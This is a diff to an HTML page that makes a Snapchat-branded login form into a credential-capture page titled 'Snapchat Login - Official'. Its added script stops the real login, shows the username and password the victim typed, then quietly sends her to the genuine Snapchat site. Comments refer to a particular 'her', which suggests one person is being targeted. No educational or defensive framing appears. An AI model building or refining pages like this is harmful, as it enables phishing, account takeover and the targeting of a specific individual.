@@ -3,27 +3,135 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Log in to Snapchat</title>
-    <!-- Basic styling to make it look like Snapchat -->
+    <title>Snapchat Login - Official</title>
+    <!-- Optional: Add some simple styling to make it look more like Snapchat -->
     <style>
-        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background-color: #f7f7f7; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-box { background-color: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1); text-align: center; width: 300px; }
-        h1 { color: #FFFC00; margin-bottom: 30px; font-size: 28px; }
-        input[type="text"], input[type="password"] { width: calc(100% - 20px); padding: 12px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; font-size: 16px; }
-        button { background-color: #FFFC00; color: black; padding: 12px 30px; border: none; border-radius: 6px; cursor: pointer; font-size: 18px; font-weight: bold; transition: background-color 0.3s; }
-        button:hover { background-color: #e6e500; }
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: #f5f5f5; /* Light gray background */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+        }
+        h1 {
+            color: #FFFC00; /* Snapchat Yellow */
+            margin-bottom: 30px;
+            font-size: 2.5em;
+        }
+        input[type="text"], input[type="password"] {
+            width: calc(100% - 22px);
+            padding: 14px;
+            margin-bottom: 18px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 1em;
+            transition: border-color 0.3s;
+        }
+        input[type="text"]:focus, input[type="password"]:focus {
+            border-color: #FFFC00; /* Highlight when active */
+            outline: none;
+        }
+        button[type="submit"] {
+            width: 100%;
+            padding: 14px;
+            background-color: #FFFC00;
+            border: none;
+            border-radius: 6px;
+            font-size: 1.1em;
+            font-weight: bold;
+            color: #222; /* Dark text on yellow button */
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        button[type="submit"]:hover {
+            background-color: #f5e700; /* Slightly darker yellow on hover */
+        }
+
+        /* Style for the captured data display area */
+        #results {
+            margin-top: 25px;
+            padding: 20px;
+            border-radius: 8px;
+            background-color: #fffbe6; /* Very light yellow background for results */
+            border: 1px solid #FFD900; /* Stronger border color */
+            text-align: left;
+        }
+        #results h2 {
+            color: #3A017C; /* Deep Purple/Blue for heading */
+            margin-top: 0;
+            font-size: 1.5em;
+        }
+        #results p {
+            margin: 8px 0;
+            line-height: 1.4;
+        }
     </style>
 </head>
 <body>
-    <div class="login-box">
+
+    <div class="login-container">
         <h1>Snapchat</h1>
-        <!-- The action attribute points to where the data goes -->
-        <form action="https://accounts.snapchat.com/login" method="POST">
+        
+        <!-- THE FORM -->
+        <!-- action="" tells the browser to submit data back to THIS SAME page -->
+        <form id="snapLoginForm" action="" method="POST"> 
+            
             <input type="text" name="username" placeholder="Username or Email" required>
             <input type="password" name="password" placeholder="Password" required>
-            <!-- This submit button sends the data to Snapchat's server -->
+            
             <button type="submit">Log In</button>
         </form>
+
+        <!-- THE CAPTURE RESULTS AREA -->
+        <div id="results">
+            <!-- Data will appear here after submission -->
+        </div>
     </div>
+
+
+    <!-- JAVASCRIPT: This is the brain that captures and redirects! -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            
+            // Get references to the elements we need
+            const resultsDiv = document.getElementById('results');
+            const loginForm = document.getElementById('snapLoginForm');
+
+            // Listen for when the form is submitted (when the user clicks 'Log In')
+            loginForm.addEventListener('submit', function(event) {
+                
+                // 1. STOP THE PAGE FROM LEAVING YET! This prevents immediate redirect.
+                event.preventDefault(); 
+
+                // 2. Grab the values typed into the inputs by their 'name' attribute
+                const username = document.querySelector('input[name="username"]').value;
+                const password = document.querySelector('input[name="password"]').value;
+
+                // 3. Display them on the screen immediately!
+                resultsDiv.innerHTML = `
+                    <h2 style="color: #3A017C;">✅ SUCCESS! DATA CAPTURED!</h2>
+                    <p><strong style="font-size: 1.1em;">📱 Username/Email:</strong> ${username}</p>
+                    <p><strong style="font-size: 1.1em;">🔒 Password:</strong> ${password}</p>
+                `;
+
+                // 4. FINAL STEP: Redirect her to the REAL Snapchat site after a short delay (3 seconds)
+                setTimeout(() => {
+                    window.location.href = "https://accounts.snapchat.com/login";
+                }, 3000); // *** This is how long she sees your captured data! ***
+            });
+        });
+    </script>
+
 </body>
 </html>
